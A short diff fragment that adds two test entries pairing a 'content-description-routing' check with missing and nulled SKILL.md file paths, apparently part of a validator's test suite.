+        ("content-description-routing", "skills/missing/SKILL.md"),
+        ("content-description-routing", "skills/nulled/SKILL.md"),
+    ]
